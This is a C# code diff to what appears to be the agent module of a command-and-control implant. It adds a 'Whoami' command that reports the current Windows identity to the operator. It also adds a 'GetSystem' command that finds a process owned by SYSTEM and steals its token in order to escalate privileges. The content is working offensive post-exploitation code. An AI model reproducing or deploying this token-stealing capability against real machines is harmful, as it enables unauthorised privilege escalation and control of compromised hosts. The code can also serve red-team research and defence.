@@ -8,6 +8,7 @@ using Shared.Models;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Security.Principal;
 
 namespace Agent.Modules
 {
@@ -31,6 +32,11 @@ namespace Agent.Modules
                 {
                     new ModuleInfo.Command
                     {
+                        Name = "Whoami",
+                        Delegate = Whoami
+                    },
+                    new ModuleInfo.Command
+                    {
                         Name = "Create",
                         Delegate = CreateToken
                     },
@@ -43,9 +49,27 @@ namespace Agent.Modules
                     {
                         Name = "Steal",
                         Delegate = StealToken
+                    },
+                    new ModuleInfo.Command
+                    {
+                        Name = "GetSystem",
+                        Delegate = GetSystem
                     }
                 }
             };
+        }
+
+        void Whoami(string AgentID, AgentTask Task)
+        {
+            try
+            {
+                var identity = WindowsIdentity.GetCurrent().Name;
+                Agent.SendMessage(identity);
+            }
+            catch (Exception e)
+            {
+                Agent.SendError(e.Message);
+            }
         }
 
         void CreateToken(string AgentID, AgentTask Task)
@@ -99,6 +123,32 @@ namespace Agent.Modules
                 {
                     Agent.SendError($"Failed to impersonate token for {owner}");
                 }
+            }
+            catch (Exception e)
+            {
+                Agent.SendError(e.Message);
+            }
+        }
+
+        void GetSystem(string AgentID, AgentTask Task)
+        {
+            try
+            {
+                var processes = Process.GetProcesses();
+
+                foreach (var process in processes)
+                {
+                    if (Helpers.GetProcessOwner(process).Equals("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase))
+                    {
+                        if (Token.StealToken(process.Id))
+                        {
+                            Agent.SendMessage($"Successfully impersonated token for SYSTEM");
+                            return;
+                        }
+                    }
+                }
+
+                Agent.SendMessage("Failed to impersonate token for SYSTEM");
             }
             catch (Exception e)
             {
